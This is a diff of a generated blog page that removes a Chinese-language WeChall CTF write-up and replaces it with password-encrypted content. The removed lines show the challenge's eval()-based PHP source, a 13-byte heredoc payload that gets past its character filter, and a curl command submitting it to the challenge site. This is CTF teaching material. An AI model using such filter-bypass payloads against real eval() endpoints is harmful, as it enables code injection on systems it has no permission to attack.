@@ -22,19 +22,20 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"vkkkv.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/tomorrow-night","dark":"base16/tomorrow-night"},"prism":{"light":"prism-tomorrow","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#ff3e3e","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":false,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/config.min.js" defer></script>
 
-    <meta name="description" content="Challenge space 的 PHP eval 小挑战。目标是在 13 字节以内构造一个表达式，让执行后的 $spaceone 严格等于字符串 1337。 页面给出完整源码，核心逻辑是读取 GET 参数 eval，删除一批字符，限制长度，然后拼进 eval()： 1234567891011$f &#x3D; Common::getGetString(&#x27;eval&#x27;);$f &#x3D; str">
+    <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WeChall - PHP 0819">
 <meta property="og:url" content="https://vkkkv.github.io/wp/WeChall/wechall-php-0819/">
 <meta property="og:site_name" content="Hello Navi">
-<meta property="og:description" content="Challenge space 的 PHP eval 小挑战。目标是在 13 字节以内构造一个表达式，让执行后的 $spaceone 严格等于字符串 1337。 页面给出完整源码，核心逻辑是读取 GET 参数 eval，删除一批字符，限制长度，然后拼进 eval()： 1234567891011$f &#x3D; Common::getGetString(&#x27;eval&#x27;);$f &#x3D; str">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-06-09T08:54:03.000Z">
-<meta property="article:modified_time" content="2026-09-08T14:40:47.401Z">
+<meta property="article:modified_time" content="2026-09-23T06:59:49.172Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="exploit">
 <meta property="article:tag" content="php">
+<meta property="article:tag" content="restricted-wechall">
 <meta property="article:tag" content="wechall">
 <meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
@@ -207,7 +208,7 @@ p.spoiler {
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -220,7 +221,6 @@ p.spoiler {
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -241,12 +241,12 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">370</span>
+        <span class="site-state-item-count">328</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -319,7 +319,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -361,45 +361,31 @@ p.spoiler {
     
     
     
-    <div class="post-body" itemprop="articleBody"><h3 id="challenge">Challenge</h3>
-<p>space 的 PHP eval 小挑战。目标是在 13
-字节以内构造一个表达式，让执行后的 <code>$spaceone</code> 严格等于字符串
-<code>1337</code>。</p>
-<p>页面给出完整源码，核心逻辑是读取 GET 参数
-<code>eval</code>，删除一批字符，限制长度，然后拼进
-<code>eval()</code>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="title class_">Common</span>::<span class="title function_ invoke__">getGetString</span>(<span class="string">&#x27;eval&#x27;</span>);</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>) &gt; <span class="number">13</span>) || (<span class="literal">false</span> !== <span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;return&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;sorry, not allowed!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$spaceone = <span class="subst">$f</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="variable">$spaceone</span> === <span class="string">&#x27;1337&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<p>最后是 strict comparison，所以直接提交 <code>1337</code> 不行：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$spaceone</span> = <span class="number">1337</span>;</span><br></pre></td></tr></table></figure>
-<p>这样得到的是 integer <code>1337</code>，不是 string
-<code>"1337"</code>。</p>
-<h3 id="solution">Solution</h3>
-<p>约束很紧：</p>
-<ul>
-<li>引号 <code>"</code> / <code>'</code>
-会被删除，不能直接写字符串。</li>
-<li><code>$</code> 会被删除，不能引用变量。</li>
-<li><code>.</code> 会被删除，不能拼接字符串。</li>
-<li><code>(</code> / <code>)</code> 会被删除，基本不能调用函数。</li>
-<li><code>&gt;</code> 会被删除，但 <code>&lt;</code> 没有被删。</li>
-<li>长度最多 13 字节，且不能包含 <code>return</code>。</li>
-</ul>
-<p>问题变成：PHP 有没有不需要引号的字符串字面量？答案是 heredoc。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;&lt;&lt;a</span></span><br><span class="line"><span class="string">1337</span></span><br><span class="line"><span class="string">a</span>;</span><br></pre></td></tr></table></figure>
-<p>这里用一字符标识符 <code>a</code>，字节数刚好卡进限制：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;a\n1337\na;\n</span><br><span class="line">4 + 1 + 4 + 1 + 2 + 1 = 13</span><br></pre></td></tr></table></figure>
-<p>payload 只用到
-<code>&lt;</code>、字母、数字、分号和换行，都不会被过滤。进入
-<code>eval()</code> 后等价于：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$spaceone</span> = <span class="string">&lt;&lt;&lt;a</span></span><br><span class="line"><span class="string">1337</span></span><br><span class="line"><span class="string">a</span>;</span><br></pre></td></tr></table></figure>
-<p>heredoc 表达式的值是字符串 <code>"1337"</code>，因此能通过
-<code>$spaceone === '1337'</code>。</p>
-<p>用 curl 提交时让 <code>--data-urlencode</code> 处理换行，避免手写
-<code>%0A</code> 出错：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL -G \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  --data-urlencode $<span class="string">&#x27;eval=&lt;&lt;&lt;a\n1337\na;\n&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/space/php0819/index.php&#x27;</span> \</span><br><span class="line">  | grep -o <span class="string">&#x27;Your answer is correct&#x27;</span></span><br><span class="line">Your answer is correct</span><br></pre></td></tr></table></figure>
-<p>等价的 URL 参数是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval=%3C%3C%3Ca%0A1337%0Aa%3B%0A</span><br></pre></td></tr></table></figure>
-
+    <div class="post-body" itemprop="articleBody"><div class="hbe hbe-container" id="hexo-blog-encrypt"
+     data-hbe-format="4"
+     data-wpm="Oh, this is an invalid password. Check and try again, please."
+     data-whm="Oh, this is an invalid password. Check and try again, please."
+     data-salt="50f205a12c7e6365e1ed6f2d9f015325232e23ce6e8f3f7bf3a7ce4642eb71be"
+     data-nonce="29cf8d04b2cfcaa596069e46"
+     data-kdf-iterations="600000"
+     data-auto-save="false">
+  <script id="hbeData" type="hbeData">
+    11cdce7554365aca3ade2f6d66fd33d3998e84d7b09f3118e2122aeb00ccfb2c0cad55e36a7a4e9ee604b50d96e3401e0909924ff3022d45eb7bff222c83e3cd1c19b414c1aafbc8372194aff668110f2c5595c82870b4835e106a58686f6654a1433330f8fcba2b374c2589c0e30b760039ae4815aa15426969dcade5d19098bfbae7ee013c4151aead398fcb5a8260078999b1d6e535d4599815ff7b4de5ac13f75c34281c524c0ca5a0f8b3a0e0cb58d42c69008efbda8dfde60c55980459c8bd94cb5e0cf08ee22da2d4fc17ec62ed703659cf0a9d9162d808e7e3af3910020362b8efcc7eef9b4c142f3dc04f0fe664b8ace57e3e4d7ed2d31119bcf115087f4bc95d976b18b46d273f85245b18931be59e9137db8fd8c338b7b4f251a87e0ec2294eb8e6d9d07c71f56efc9fb88c90f4b0bfc0c0fa43e35277d6b4f43db9144f481b7f6a73579c82b088e2705186f651f7d9fa52b5cb99584a31e101090aaf1d66350db8256863189cba3a6921fd561bc91bc6b8e4c68455245f7d0222e7c14b1ded23957ab04c5ee46036d1382613efa0f767e92b091b03f7f91c81078af34c0201d5bbcc804653e6b87b2719e5d719d219a123fe874a2fc0f49e79b0926dd30cfd093551ab78dba6b3e8d04659fcd00ac12f4ed2cbf0a1ca716b9c0f4cda7a525582f35b2785abd244058a0ad00350b1c89434550982cb8487357973238adb01ccb60a5dbd596b6268c98972396910a2f027cdb7d78ea8c63d878d7207a18ea1ff7088415aa112a2511e62065850de870982bf6bd6b0c95c146e016dfebdd44c49bb4beee8582cd901c0b2837bce6124d1ec5fe73e9b73a6db350099a9a29ca6ab986e0b40ee14a3c8da40cd74afb97a76295853847dd8d65ba4b3f3f30e83161e3625176c4e75d8dc25affc12f610ae99aed38d25a850508c03cbbc76ef440fdafca283b75d8ca4b4ddf7e0ea9c6133bb1e6bd7363017ddb4c7908ebde8aa2abcba001a775974882e274227eb2a32751f45541e6524c28da420623b1fd6af22b2d0a14478e779531e8ed387d36786478b27423051ce345e3f6082cd272a40ff56fa0f3a427361a2bfb82eb4de780fc04b167e19983beced7f18afc2a55b41b9675e5be144adcb6668ecdda5248b65f0276c46583eadba48dc3df001c1802ad8f320d99278eebf872613d0b76ee37c06e429d94d572306b9652d1078778259b53c6db02530e5d9b09d09e5ff99591dcefe33633a8534591a88748e7ed635b3c1aa4f51d4a367a01c4d04539e7bfe3a17a889b117a4d64cd9db866517a6ad6e65cf71245a3e5990c683d6cb60124327926693339e3cb0ca8c6a6f05e54346e2b49115ff98a659a0b9c499c19bb3e053ea646f1473ba5dca84a921b212d91faa6d818d28df664626cac406e4c444061b42d5e9231fee51eee00a947b802e0081ed47521f4e1594d38307b04bcead397827f58fb6a4e0fcafb3555028a2ac88f2333ee947a8123155b037c7c3d31a60002b8fd112d2bab48a4c99614dcd6bc3e4035e31dbdaa56ebadd710a5d3162c955b7ba4ccb7f68f94e672cab02cbc457a899df4f0d06de9024a77c37e98691e1a09b3b241d5e942064d526fa60801759383f11f3882aecec15ef4948f337e0e1fcb506b70baf228d6d53f23649710740e938caff58822d448a9a23ebebf75112c28670490a690146b6551f52fe7227418002d18f42f8ce7f5e58b21125f357389b88b1a72192da2bf1788444b1d0b03c700b0925af72735fb295f034b04d4449e2ee19138bbba6a58be812caee05a844a419a81e678c8ed82c05b2ffe69219d9fe800eab045bbccbe3b6bde63dc634e168e1dae822dc73833eed0b526522fb62a04602a1513ee499319622f04f1070a1b924ff02634ec5c2e0117ddf11f0f9fa49f17968b83b2ff90712c2ef61ff367e2c36be4f5880e85491ba9ede1fbcb4fe098d8f06b183fd8ddd54129e79bacfabce41180e2446e09a18b764498f9844d43ba47f51f1d41407ac558f7b7c262b59035c29144b0ab2fefe487830f6d5c4a39a93c22c3c5d891bb9c02008fa6b6acee814f5be5f801b70976d792e674777d7e1e633594d2bd68b45c33e33f9f90712ec0db27c430187d17763016cc2d8c63e5b9da4c4e0628039a2900b5efcfc7f979d31175d0a1c1ffdc9f516d879a3290f5a67e5aa79925f8906dcad1d64bae4e578c5106371ffed62c045d2be5021ae1be4db19b1822758ad634f50bfc892c68e5596e6d5ff0f36626edd8bb7a4563742f78a24dcdc99cfe62cff4a8bc6fe6af8a2a4ad7b07c3091dc9bf73b68735ead8bdba87ab2e14b01dac603a9c14e54d34e9abd26fc948efdd3a9a5449ffdf40e3f6680cee5e17cc4abd4de2f4f63eaa9acabb85947ba73c4b33eb02acf8ab6e86fbb7a5a29d25de0bd473a4cf04d292c29f7eb8052f3be461452a713bf3dc6dbd3b58b10a1405a84d59f0bf0fb935600ad4a685f69019058fc3afde1ca4ff3da52642e75960fd0eabf6506b7efa266330726e7cd9edba406102632c19c4eb83640c35ac5a98258dddefccc0143814183911bd71f516a4b1a52908e6b54b5195c18aa3b8399292ee367f1999c3083ba3e05f09742b5cae086d74025ac93622e7dc8368e802c8d1107fc0853b2f169314a0fbcdc6322311b57b2180ee1b0bd142bfee4edc478e4ce6899c1bb6e2c05cb1761ef3a402eae21477350f51a8576f9f031cb65a5b84689bee54b5e77d5a8ada9781fe535ba9c16c011bda7d8a8cdd31cfe1d0d04a4c7536cda7432c442563e074643a5d72d8539e63c9df30e2718f04c3707e546a4d2050d71205df95095ada8532375e74177b48a163680e17796d9eb0d38be5dd5ec8676899632d2b58ddae54fcbe8181779e2ddb34a992c42dca8c99f8b365c48aea5406294994452845d5cd8e58b3ebf2fd916f4f92275aa09e345991c4cf602a7e18c49ea3af0318e4937dffd08de74c27999d32ca529e4666bc463abe21c5e94bcac8124ee4fcb2ef0bcd20f912fd203ec3c4e603b98b1c493080c8f7301f3db1927c2952b3f83ed0f99e6dba0068b90349fc3473db1b27e953e2dad61e1921b362ad9b348c0d9c66d4c53453dbcf87bca95977db5b183f8120778a94ca1cbda82fde1ab7d9ae213d5c5150d88c354b5a0f2df9405400535dddafc357b237ed06462fb0422f3cdcd1ccfea396dbc5df2fd6532a6575d69042fb8fd0c60674cdb25f3fcd2aa0e553988a1156c4f8e860bb4a8c67d8592070f62f6abbd0a1f6b905c8bbe2c30ca7746b7325aab8fe0bd0ebb93f156746d0de0bd0d536df2e73ee3b70456de6d447f7e040299fcf53bf2d85e6cf48e8bb98ed8f9a5f3999b4c8112a29ea6158a0cc25b3ca4d457f56fc626dcd18efb17c80624635fe80095bc10c054bb979eb7b9f41e9c6115ff017f46f340ac0909a033235fc2f8c9985d88c394ad4971dd1090352893ac411dc4ff7d2fdc21f4427dae7dbc322feb8be55fa379fb2c109dac206ebfd0b7b454ae28d3759a6dfe3cb4ab80e4b32b74722f91ce01436c53308301aeb217fa79317f9c2a57b79f71d41642ddd78871f63ce4ef0a72d853f6d743851123dce22b5a4c9d923bb19e444f233ecb74d5448ae73cadbfaff465c02ab2f4dc537d663e8f9a167ca5d48295bf9319641b02cea263fd6f458f38a14667fc7a0f5fdb66d6daff1032e1104305cd50b1dac0b8f1b4c37f34c59952ed900177323fe031ab8d00d471d8dbfa7ce70f114d2e6f8c7eee6615e8e489750738b27b33f288e4957275d8968e5881d1715f75e69a0686f9de08d5ad3f09bf9c958b61354569e60bb3eea311715915e2ee899d618e8fef4a7f31a8cbf36ce8f0fa15afab48386e9784252ca15a2adf9e9a7f5a6a180e8d7c87bd9a5c16abfe98b6b59084290e757f935f90823aff753f084ab85dc17ccb9db5d2297114e686e15e671f9a938bee9e1f89108ed0cc87690864968f0f1b62a5b73623799ea0cf222ad3a076d762cd8765f9f1b706c5a9f3aed5055add77e549696ccb35b8839b7c30517506600addb2b9cf0df7a68a770affdf274d17d50445fefe87101c954c16b914ff7fcd17ba3e63dc1974782996e2eb6922cb8a76f7a8e845d8a2dd5257c2ae5e4b70028907508f2940ee825223985f8e455134de5ddbf7c847f3a530ceb0370c68fd1d85620db638a498d56b1db10cf67322e75b131e6b5f5db865a4dcfd8a8d8cba56645bb569d4d94a510a854e1acee38a267239bb8f18010488271c526435e486dc1e4b3312bd4a048ee1dced98ce804540ca8e8340b45230f038547a1802ca8faccafae1a350dd911dbb5f4be11215e691c5ec06b397f19a830f89246fceb3084603e098172c2bc54620d8a1f56b967a82b1ed8ef95d164a22e07eb3c6c5d82a87898bdbc28db8b2c2ac78dcf38e07417c01ed5d737d0abb5a51783cf5379f3cdc97dda3243578df6967a428be7748fc6f73e3f1a36f44a972a61343cff68634516ea4a23249d3d3c3f617c7e2b197b47a9b2652272fd85fdd6799c6bb7cce3b0b3db8245a46fc91985908dfad698defc22a3df6588d80fc8a5cc212fbcd0bed2ca873b9ced641544396585b53d13fb30230b05505e0c05d0f48616e0c44e18829334dd08cf31afced12148dfff6dc4b4d7a1481e4e048699cb33f6d23df57ac0247aa9a326df5c3995e8a5f59713eba6c4f1559938201e9ff6b8e9dcccc1c32e51fcfa9ac6dd24a883dcf0fa3b16cab841b0f78ec9455f42c13224d8f764f1e8040bf563b756fae6d2d2fe7a887b5724c2fece4ee0f5dd60efc169e3d55893f7ed058b00331ed0860f8c2f49beb838f53a13bcd3733e859c543fe0ef7aae05b34c856e790bd0f322200e4ab223526ad6166b7f5b721fc03741544ef6ced1e68631289cfb50306847cec71ecdf446c7b42d3f037770c407ff12da36093a00abb00e906219e98301c49e1a1c287dbdf6cf34a6dedb113c2f73436d1238935ebbd35a88422c01a0e2d1c88ae152629d46f99a16f78123a4b51c127775f22af7649d49e387140b840396dd33f1d7e2c3bd39f2633d2b0368c090a423112ab2951f6614e6bcab3e8aa327347814662c417f373a2087cddba51587b159bbc2fec51576a7d7a37de5fe3d4e0eceaf0656dab7356664832e30e0b40cc905897daacf01db757559365573b85cbb6d7204cbb51ce9e03e9318452c6d631d2656b38e5bf3ff607862ad0fc3dba80f91493da339c296830df83e519320bfa46aaa0961f5f09772813a5ac5c21a499c9a4d1e988ac2c0aca85eb6345024ab795f7cbccb9766d7a6b5a706212d8f032ea8ae5ae21c1114ee3453b26bfc5142009b32f883a4bc8141adef6ae5180e1ec891357fd07376f326d65f03929ddf9543fc95eb433a5fb6359a94c8138789de1f9fec76704b6d034fbcff75bd59dfe1621aabdf57e7e2c67a6e17f0be7d996b03444f4bc2442220f052633fe0694d99213f8b1982aa85e712794815cf6d16620ebb908e93d4039d0f86aede3ec64cf5ed9107b212dcd5fce9322c83a2e5e2ff6852e6aafecd734002b90c5bf6d82f06336aef2369037e968051597c2e335582867bb0f0849d95240c897f6ffd709410d01997db76782b0019af7a70d79dd10034e40cf180b906470059c80799a1ff6cfc0dbbf269c9169d3af66379e2bc9ab48de771ed6ac1717ce32547838548d93859a0e3a429004c4b43e4e24e3127f5ee87c62743071f0ac1d0d560504a4989fe8b8fd143ae09e3972522e1083e4214f57d91092d27096f7db3de5d2b00d90c729e9b4a7f5a9710965f6d6bb23420349d147b188fb2a3c430e15544068336e09a6362a153292ea2810cec4885acbf207303016259d9a6c5aa0ab18cc8a01b58864017da41b451e5470c5072d763d0343a9e9425f6649be5a0600d97a05464d9713c290a92e6cc3a2348778968a6e96a958e0b6032f5e3a3468da976da565953aeaaed7bc2ee77a5ea0226dcf77e6510d8d486b44055f40a671ddb4c73416274d5440dd09b3e4d31c4242d4c7c025246058c186310d1bf45b443817be2a7a91ea012c57e2c4a9f39981a731a1d890e23afdf202bb1e09914a6f96c4e3f2fe6196013002a476824d7c2b70092e8016835cb0400f2058b0721a7a6ef6992ff0150daa1776a42600efc66c960c0ebbeaab90953948042ad222644741db81c23300440b34fbac3d0c08896a05102f13e6328ec7d1bc4ac0c48cd1d3152d43f149e4354b382b448979f87f0c86157d96cd1399ee580ac8a81a4bbd5c88d9ed82d119aa35d166b713928e652335099b8e4307c7c5530ef7399563ab6fe02746fc4ea2d65806adb45d99c97aacbadb53754db1a16a6502d2ecc18e4647124e6cfb825f9bd6d7db54a69a697e70f3c158e22b18e158d37232228a17d95a68d21a56d8d3e3ccf469f18d161d0d92f69381848c0183bb47ff747a30ae2e014d50b730635693165343503c749b54dd131965059e54b4dd68c7a22de42aa7d8a7b95f2ae64bf6ef7f41328627705a47fb02d264e8da38f862c4919676676cf820dfeb938063610548e1207e8d15a3381d07b40f6d8ae17db6de6456ac55326f72b6d1e7e816649db8c4f3cdec426cb25cd00247b38646f64b849e7a5fd0faaa7ccd3d9d0fc0813cfbbf0e31e751d8a45d4445bfd774754c656a2c2c18bdd44d16eb2fc5756e535b83cb549110c31756bb51404535c1ce52e4baf47a23cb5e1f825e84a050143875f8b91e16b559188a7b06c6ea0e0be318ceb041b30890214f2536f6bf90141134ff6d5b032bf916ac66d9c77c31865bb957db48dbe59c49a43fad49dd82a36e1dae38c4264fbe154638cb1aee052f1b824969482490c6019fe64be4c2d8e70d35dca7faba91625e483def5827c6d7f19ce5cb56f9f4a7593d548dd04142f9bcceda8aa9e44abf04042a10fdd7845ef8cdbc8ce1a565d3215c7bd4b05b220dde5833ab7e9bf4ec411458081a297e08c352f62c75dcb35389635fd52386af92a90f5c8c5cbbcd11756d65907205432b0b5d38a3b6e7849379bd95a647b9acb41b70e81b20fb26e67c5164152e56b3bca4b44e42086c4d72806ddad71e1539548f57bd3ccfefba3c78d02e977703ee48ed9f51c56c241173001834af52c6825debd3f20aa0d2d00ca831a4bc15bacc4333fa5fb155f3fb0baa97648bf35374cd669bf842d9aadd7f834224b57e4ad2d761dbc254a5d41a2b77f39f58253d2db9dd35ebb8e44eed4df1e0e4b44a617b76d4ac455f934575939644adc0584e5d8d52b4498db19ca635b5dda4a0fc4729c84ffea69f6cd51a7d32142bfc9d2b07a03b358cac1e6719501361dee80d3359f63e73ef89f0fd63489d8ee485bbc1409cd967c1f65372841576ee717026c45c5cd77648e6cf573af29afaa3ffe7a08e45aab9d43d7645c8c652507e4c6afd05d3a25b1fbab4564d25f107ce4e6d6145c88f661ad265a306dbf12bb909cde9fa7168d537b60251f739268eb5a3248e7fc982049f8a6fde6f7fecdea090133a198dc6fbf84f1fada2bd76996ce0f31736906639a82b22754499433d871d5088363752b073cd968a50e7c128d4cddf4167bfde48f49c7250c381bb93874826cb31c1fd5e273e745e699e92130424d820f11b066d37a5e7787cd9e7c60dd1a7a3e7b695653b6f0900868999ba85580ff694653a7d0ba056572aeea05d319b4b004836a76c2543ab4527830b1faa95f58404c62fb592a95b25080de8f1fe523542888ca1505605b6ef88831debf510ce136a9c187c8ff630091994c4a3cc3c63f2015ee72bc7e8cc6bc866f1f6907f6ff3cc401149dd9858bea8740789efbdeb7b940eb2b0ba62a11fd2882b6437b41498266fb9dc683fa072abaf837845afd023713648149f5576f1886ce8bdb6274ee737c32304a8a54ad011e1c315875615afb7ad280b4b9ba14414a72ec1e6505f538f37d9acf34c2eb9edca1d55e6c6e26ace4bb4508d9cbef16734e123997a6020d5464253521f61c809ecfbdcd29c86c1a92065d312dae3893c4e45b71319d05f20d913524df22f408add62fcd314df61400850117f35947b35f45f3fc863637c4271f203c3f9aaea5b3ea4666674c9b195289ac81daed16a3cd86ee0062deeb0ad7a22b4114e5e786756922373185f9145b9e3da8ebfd2845d8cd9bd976ebffc245e868974753a483b476e7a6352b60c42dbacad32266a865641f7b18d7bb4ece412c8bd8a00ecf9cbef6394145407e90a719eaeb1261a633a72701d2019e8dc8d719871f3ffc52796d78096b51fe98c102dda89e5c9e2a75c35d50142c1421f97948a8891eb0859dcf0539e77663085496e8dcf225a4d60f93245dd1afbde34e3f855ddbc486b432edd770a92fbd89b62c3b2628dda76600877eec6eae90111be84fa9bba04a46d05a1dc89c396cf14b22aca70386f291de826184272848ced3cfb8e304e357e4d04c190353f8494f026b678fa0ae986eeabdf097c6db017fafd2f0540a891e9d37a6d6bdd382c471e87ee9ed05ec2cbe95b15249c484f4584040805a58b675aa0b7a1c1344fa2c645a1113f6ef084ee2a44c1dc564d4ac3dad2f9678628c83ba29d2c07111c107318d9197de40742ba8e791eb6ddb6df8270628b4887a4587902ad127e3e1609a532007e9f5800e823a27d9210ad5e3c12988477ae5546a1ca5aa57609f46dab1ba8bd559cb71886eb9f55cb067e4bf3e2f3abda41ecdcd928efc45704d101faf025da4d3add7ff24cabeab2b516dae1b508c01b50b971c4f595901e0aa690c31ea41ca98074245cb53f570d4c9fead25a2b254e3476ac4497631b4fa7a1f72a41ca04ec16372fda6a10cbf017b3174920d0be37c55fe7b29f700d2e63bbad3c475f7e37adb388bce8dc2e0a6491d366dfe99a23e7c3f70a46ec1d5b938316ea7647d8d740fba67734ee2322a8bef0329916448a9d391670e56dec09b3b608dac818882d74c42cb3edb3792d371a1f9daed154c05b37b10f5ab045913f823891e3a10a71acbdf9e21f0985887185d7bce29a9d91be70eee89f66348b10de39f8366767655d58a4cd1c9319b375b32aefc58fd91c0f445b3037a084c4bbb3b030b6accb7b109520f67bd3735f73e9a7cf6367d0c07901fefa17792c75dc67b186be3f134c92215ad6a0119aa2c268311fc7ea81383e0738d44cfcc3298b848044e2da3d2c6dd7b61f7690d5fb893c853b2e98e39024f9a19bcc573462429e448cf585d815b80b195af1b75570a7af61ba3d6151f108e31ddbeee538e54976d42a62d3fe0629126089751c5b8d5795794db6246d38ed05d1d2d0b5bca36e6bad8db1bceaab481
+  </script>
+  <div class="hbe hbe-content">
+    <form id="hbeForm" class="hbe hbe-form" onsubmit="return false">
+      <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+      <button class="hbe hbe-button" type="submit">Decrypt</button>
+      <div class="hbe hbe-error" role="alert" aria-live="polite"></div>
+    </form>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.51dd9f3b98.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -444,8 +430,9 @@ p.spoiler {
           <div class="post-tags">
               <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
               <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
-              <a href="/tags/wechall/" rel="tag"><i class="fa fa-tag"></i> wechall</a>
               <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+              <a href="/tags/restricted-wechall/" rel="tag"><i class="fa fa-tag"></i> restricted-wechall</a>
+              <a href="/tags/wechall/" rel="tag"><i class="fa fa-tag"></i> wechall</a>
               <a href="/tags/exploit/" rel="tag"><i class="fa fa-tag"></i> exploit</a>
           </div>
 
